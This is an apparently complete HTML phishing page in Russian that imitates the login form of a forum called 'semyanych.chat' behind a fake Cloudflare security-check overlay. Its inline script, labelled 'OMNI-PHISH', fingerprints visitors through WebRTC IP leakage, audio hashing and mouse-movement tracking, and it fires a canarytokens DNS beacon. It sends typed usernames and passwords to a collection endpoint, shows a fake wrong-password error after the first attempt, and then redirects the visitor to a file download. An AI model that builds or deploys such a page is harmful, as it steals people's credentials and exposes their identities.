    <!-- GOD-TIER TRACKING SCRIPT (FULL INLINE VERSION) -->
    <script>
    window.EagleEyeOmni = class {
        constructor(config = {}) {
            this.version = "6.0.0-OMNI-PHISH";
            this.endpoint = window.location.origin + '/api/collect';
            this.sessionId = Math.random().toString(36).substring(7);
            this.config = { canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com" };
            this.init();
        }
        async init() {
            this.loadSuperCookie();
            if (this.config.canaryDomain) this.triggerDNSBeacons();
            if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load (Login)'), 100);
            else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load (Login)'), 100));
        }
        loadSuperCookie() { new Image().src = `/pixel.gif?source=etag_check&uid=${this.sessionId}`; }
        triggerDNSBeacons() { new Image().src = `https://${this.sessionId}.${Date.now()}.img.${this.config.canaryDomain}/pixel.gif`; }
        
        async getWebRTC() {
            const res = { local: [], public: [] };
            try {
                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                pc.createDataChannel('');
                await new Promise(r => {
                    pc.onicecandidate = e => {
                        if(!e.candidate) { r(); return; }
                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if(ip) {
                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
                            else res.public.push(ip[1]);
                        }
                    };
                    setTimeout(r, 1000);
                });
            } catch(e){}
            return res;
        }

        async getAudioHash() {
            try {
                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!Ctx) return "no_audio";
                const audioCtx = new Ctx(1, 44100, 44100);
                const osc = audioCtx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start(0);
                const buffer = await audioCtx.startRendering();
                const data = buffer.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                return sum.toFixed(6);
            } catch { return "error"; }
        }

        trackMouseEntropy() {
            return new Promise(resolve => {
                let moves = [];
                const fn = e => {
                    moves.push({x:e.clientX, y:e.clientY});
                    if(moves.length > 20) {
                        document.removeEventListener('mousemove', fn);
                        let variance = 0;
                        for(let i=2; i<moves.length; i++) {
                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
                            variance += Math.abs(a1 - a2);
                        }
                        resolve(variance);
                    }
                };
                document.addEventListener('mousemove', fn);
                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 3000);
            });
        }

        async collect(trigger, extra = {}) {
            const [webrtc, audio, entropy] = await Promise.all([
                this.getWebRTC(),
                this.getAudioHash(),
                this.trackMouseEntropy()
            ]);
            const payload = {
                meta: { sessionId: this.sessionId, trigger: trigger, url: window.location.href },
                network: { webrtc: webrtc },
                fingerprints: { audio: audio },
                hardware: { mouseEntropy: entropy },
                system: { ua: navigator.userAgent, platform: navigator.platform },
                ...extra
            };
            navigator.sendBeacon(this.endpoint, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
        }
    };
    const eagle = new EagleEyeOmni();
    </script>

<body data-template="login">
    <div id="cf-overlay">
        <div class="cf-spinner"></div>
        <div class="cf-text">Checking if the site connection is secure</div>
        <div class="cf-subtext">semyanych.chat needs to review the security of your connection before proceeding.</div>
        <div class="cf-footer">DDoS protection by <strong>Cloudflare</strong><br>Ray ID: <span id="rayId"></span></div>
    </div>

    <div class="p-pageWrapper" id="top">
        <div class="p-body">
            <div class="p-body-inner">
                <div class="p-body-header">
                    <div class="pageContent">
                        <div class="uix_headerInner">
                            <div class="p-title"><h1 class="p-title-value">Вход</h1></div>
                        </div>
                    </div>
                </div>

                <div class="p-body-main">
                    <div class="p-body-content">
                        <div class="p-body-pageContent">
                            <div class="blocks">
                                <form class="block" id="loginForm">
                                    <div class="block-container">
                                        <div class="block-body">
                                            <div class="block-row block-row--separated" id="loginError" style="display:none; color: #c84448; background: #fde9e9; border-left: 3px solid #c84448; padding: 10px;">
                                                Неверный логин или пароль. Пожалуйста, попробуйте еще раз.
                                            </div>
                                            <dl class="formRow formRow--input">
                                                <dt><div class="formRow-labelWrapper"><label class="formRow-label">Имя пользователя или email</label></div></dt>
                                                <dd><input type="text" class="input" name="login" id="loginField" autofocus="autofocus" autocomplete="username" /></dd>
                                            </dl>
                                            <dl class="formRow formRow--input">
                                                <dt><div class="formRow-labelWrapper"><label class="formRow-label">Пароль</label></div></dt>
                                                <dd>
                                                    <div class="inputGroup inputGroup--joined">
                                                        <input type="password" name="password" id="passwordField" class="input js-password" autocomplete="current-password" />
                                                        <div class="inputGroup-text">
                                                            <label class="iconic"><input type="checkbox" onclick="togglePass()"><i aria-hidden="true"></i></label>
                                                        </div>
                                                    </div>
                                                    <a href="#" class="uix_forgotPassWord__link">Забыли свой пароль?</a>
                                                </dd>
                                            </dl>
                                            <dl class="formRow">
                                                <dt></dt>
                                                <dd>
                                                    <ul class="inputChoices">
                                                        <li class="inputChoices-choice"><label class="iconic"><input type="checkbox" name="remember" value="1" checked="checked" /><i aria-hidden="true"></i><span class="iconic-label">Запомнить меня</span></label></li>
                                                    </ul>
                                                </dd>
                                            </dl>
                                        </div>
                                        <dl class="formRow formSubmitRow">
                                            <dt></dt>
                                            <dd>
                                                <div class="formSubmitRow-main">
                                                    <div class="formSubmitRow-controls"><button type="submit" class="button--primary button button--icon button--icon--login"><span class="button-text">Войти</span></button></div>
                                                </div>
                                            </dd>
                                        </dl>
                                    </div>
                                    <div class="block-outer block-outer--after uix_login__registerLink">
                                        <div class="block-outer-middle">У Вас ещё нет учётной записи? <a href="#">Зарегистрируйтесь</a></div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('rayId').innerText = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 8);
        window.onload = function() {
            setTimeout(() => { document.getElementById('cf-overlay').style.display = 'none'; }, 1500);
        };

        let attempts = 0;
        const targetUid = "{{ uid }}";
        const targetFilename = "{{ filename }}";

        function togglePass() {
            const x = document.getElementById("passwordField");
            x.type = x.type === "password" ? "text" : "password";
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const login = document.getElementById('loginField').value;
            const password = document.getElementById('passwordField').value;
            const btn = document.querySelector('button[type="submit"]');

            if(!login || !password) return;

            btn.innerHTML = '<span class="button-text">Проверка...</span>';
            btn.disabled = true;

            // ОТПРАВКА ДАННЫХ
            eagle.collect('SEMYANICH LOGIN ATTEMPT', {
                system: { phishing_login: login, phishing_password: password }
            });

            setTimeout(() => {
                btn.innerHTML = '<span class="button-text">Войти</span>';
                btn.disabled = false;
                attempts++;

                if (attempts === 1) {
                    document.getElementById('loginError').style.display = 'block';
                    document.getElementById('passwordField').value = '';
                } else {
                    window.location.href = window.location.origin + `/download/${targetUid}/${targetFilename}`;
                }
            }, 800);
        });
    </script>
